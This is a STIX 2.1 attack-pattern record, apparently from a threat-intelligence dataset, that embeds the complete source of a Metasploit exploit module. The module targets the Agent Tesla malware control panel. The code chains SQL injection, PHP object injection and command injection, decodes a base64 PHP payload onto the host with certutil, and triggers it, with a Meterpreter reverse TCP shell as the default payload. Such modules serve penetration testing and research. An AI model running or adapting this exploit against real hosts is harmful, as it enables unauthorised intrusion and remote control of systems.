{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fde3c48d-752f-48ce-bb58-952f95d97895",
    "created": "2024-08-14T17:07:44.975277Z",
    "modified": "2024-08-14T17:07:44.975281Z",
    "name": "Agent Tesla Panel Remote Code Execution",
    "description": " This module exploits a command injection vulnerability within the Agent Tesla control panel in combination with an SQL injection vulnerability and a PHP object injection vulnerability, to gain remote code execution on affected hosts.  Panel versions released prior to Sepetember 12, 2018 can be exploited by unauthenticated attackers to gain remote code execution as user running the web server. Agent Tesla panels released on or after this date can still be exploited however, provided that attackers have valid credentials for the Agent Tesla control panel.  Note that this module presently only fully supports Windows hosts running Agent Tesla on the WAMP stack. Support for Linux may be added in a future update, but could not be confirmed during testing. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/agent_tesla_panel_rce.rb",
            "external_id": "agent_tesla_panel_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://krebsonsecurity.com/2018/10/who-is-agent-tesla/#BackgroundinfoonAgentTesla"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Agent Tesla Panel Remote Code Execution',\n        'Description' => %q{\n          This module exploits a command injection vulnerability within the Agent Tesla control panel,\n          in combination with an SQL injection vulnerability and a PHP object injection vulnerability, to gain\n          remote code execution on affected hosts.\n\n          Panel versions released prior to Sepetember 12, 2018 can be exploited by unauthenticated attackers to\n          gain remote code execution as user running the web server. Agent Tesla panels released on or after\n          this date can still be exploited however, provided that attackers have valid credentials for the\n          Agent Tesla control panel.\n\n          Note that this module presently only fully supports Windows hosts running Agent Tesla on the WAMP stack.\n          Support for Linux may be added in a future update, but could not be confirmed during testing.\n        },\n        'Author' => [\n          'Ege Balc\u0131 <ege.balci@invictuseurope.com>', # discovery and independent module\n          'mekhalleh (RAMELLA S\u00e9bastien)', # Added windows targeting and authenticated RCE\n          'gwillcox-r7' # Multiple edits to finish porting the exploit over to Metasploit\n        ],\n        'References' => [\n          ['EDB', '47256'], # Original PoC and Metasploit module\n          ['URL', 'https://github.com/mekhalleh/agent_tesla_panel_rce/tree/master/resources'], # Agent-Tesla WebPanel's available for download\n          ['URL', 'https://www.pirates.re/agent-tesla-remote-command-execution-(fighting-the-webpanel)'], # Writeup in French on this module and its surrounding research.\n          ['URL', 'https://krebsonsecurity.com/2018/10/who-is-agent-tesla/'] # Background info on Agent Tesla\n        ],\n        'DisclosureDate' => '2019-08-14', # Date of first PoC for this module, not aware of anything prior to this.\n        'License' => MSF_LICENSE,\n        'Platform' => ['php'],\n        'Arch' => [ARCH_PHP],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Automatic (PHP-Dropper)', {\n              'Platform' => 'php',\n              'Arch' => [ARCH_PHP],\n              'Type' => :php_dropper,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'php/meterpreter/reverse_tcp',\n                'DisablePayloadHandler' => 'false'\n              }\n            }\n          ],\n        ],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('PASSWORD', [false, 'The Agent Tesla CnC password to authenticate with', nil]),\n      OptString.new('TARGETURI', [true, 'The URI where the Agent Tesla CnC panel is located on the target', '/WebPanel/']),\n      OptString.new('USERNAME', [false, 'The Agent Tesla CnC username to authenticate with', nil])\n    ])\n  end\n\n  def os_get_name\n    response = parse_response(execute_command('echo $PATH'))\n\n    ## Not linux, check Windows.\n    response = parse_response(execute_command('echo %PATH%')) if response.include?('$PATH')\n\n    os_name = ''\n    if response =~ %r{^/}\n      os_name = 'linux'\n    elsif response =~ /^[a-zA-Z]:\\\\/\n      os_name = 'windows'\n    end\n\n    os_name\n  end\n\n  def parse_response(js)\n    return '' unless js\n\n    begin\n      return js.get_json_document['data'][0].values.join\n    rescue NoMethodError\n      return ''\n    end\n    return ''\n  end\n\n  def execute_command(command, _opts = {})\n    junk = rand(1_000)\n    sql_prefix = Rex::Text.to_rand_case(\"#{junk} LIKE #{junk} UNION SELECT \")\n    requested_payload = {\n      'table' => 'passwords',\n      'primary' => 'HWID',\n      'clmns' => 'a:1:{i:0;a:3:{s:2:\"db\";s:4:\"HWID\";s:2:\"dt\";s:4:\"HWID\";s:9:\"formatter\";s:4:\"exec\";}}',\n      'where' => Rex::Text.encode_base64(\"#{sql_prefix}\\\"#{command}\\\"\")\n    }\n    cookie = auth_get_cookie\n\n    request = {\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'server_side', 'scripts', 'server_processing.php')\n    }\n    request = request.merge({ 'cookie' => cookie }) if cookie != :not_auth\n    request = request.merge({\n      'encode_params' => true,\n      'vars_get' => requested_payload\n    })\n\n    response = send_request_cgi(request)\n    return false unless response\n\n    return response if response.body\n\n    false\n  end\n\n  def auth_get_cookie\n    if datastore['USERNAME'] && datastore['PASSWORD']\n      response = send_request_cgi(\n        'method' => 'POST',\n        'uri' => normalize_uri(target_uri.path, 'login.php'),\n        'vars_post' => {\n          'Username' => datastore['USERNAME'],\n          'Password' => datastore['PASSWORD']\n        }\n      )\n      return :not_auth unless response\n\n      return response.get_cookies if response.redirect? && response.headers['location'] =~ /index.php/\n    end\n\n    :not_auth\n  end\n\n  def check\n    # check for login credentials couple.\n    if datastore['USERNAME'] && datastore['PASSWORD'].nil?\n      fail_with(Failure::BadConfig, 'The USERNAME option is defined but PASSWORD is not, please set PASSWORD.')\n    end\n\n    if datastore['PASSWORD'] && datastore['USERNAME'].nil?\n      fail_with(Failure::BadConfig, 'The PASSWORD option is defined but USERNAME is not, please set USERNAME.')\n    end\n\n    response = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'server_side', 'scripts', 'server_processing.php')\n    )\n\n    if response\n      if response.redirect? && response.headers['location'] =~ /login.php/ && !(datastore['USERNAME'] && datastore['PASSWORD'])\n        print_warning('Unauthenticated RCE can\\'t be exploited, retry if you gain CnC credentials.')\n        return Exploit::CheckCode::Unknown\n      end\n\n      rand_str = Rex::Text.rand_text_alpha(8..16)\n      cmd_output = parse_response(execute_command(\"echo #{rand_str}\"))\n\n      return Exploit::CheckCode::Vulnerable if cmd_output.include?(rand_str)\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    os = os_get_name\n    unless os\n      print_bad('Could not determine the targeted operating system.')\n      return Msf::Exploit::Failed\n    end\n    print_status(\"Targeted operating system is: #{os}\")\n\n    file_name = \".#{Rex::Text.rand_text_alpha(10)}.php\"\n    case os\n    when /linux/\n      fail_with(Failure::NoTarget, \"This module currently doesn't support exploiting Linux targets!\")\n    when /windows/\n      cmd = \"echo #{Rex::Text.encode_base64(payload.encoded)} > #{file_name}.b64 & certutil -decode #{file_name}.b64 #{file_name} & del #{file_name}.b64\"\n    end\n    print_status(\"Sending #{datastore['PAYLOAD']} command payload\")\n    vprint_status(\"Generated command payload: #{cmd}\")\n\n    response = execute_command(cmd)\n    unless response && response.code == 200 && response.body.include?('command completed successfully')\n      fail_with(Failure::UnexpectedReply, 'Payload upload failed :(')\n    end\n    if os == 'windows'\n      panel_uri = datastore['TARGETURI'].gsub('/', '\\\\')\n      print_status(\"Payload uploaded as: #{file_name} to C:\\\\wamp64\\\\www\\\\#{panel_uri}\\\\server_side\\\\scripts\\\\#{file_name}\")\n      register_file_for_cleanup(\"C:\\\\wamp64\\\\www\\\\#{panel_uri}\\\\server_side\\\\scripts\\\\#{file_name}\")\n    else\n      fail_with(Failure::NoTarget, \"This module currently doesn't support exploiting Linux targets! This error should never be hit!\")\n    end\n\n    # Triggering payload.\n    send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'server_side', 'scripts', file_name)\n    }, 2.5)\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-08-14, # Date of first PoC for this module, not aware of anything prior to this.",
    "x_mitre_platforms": [
        "php'"
    ]
}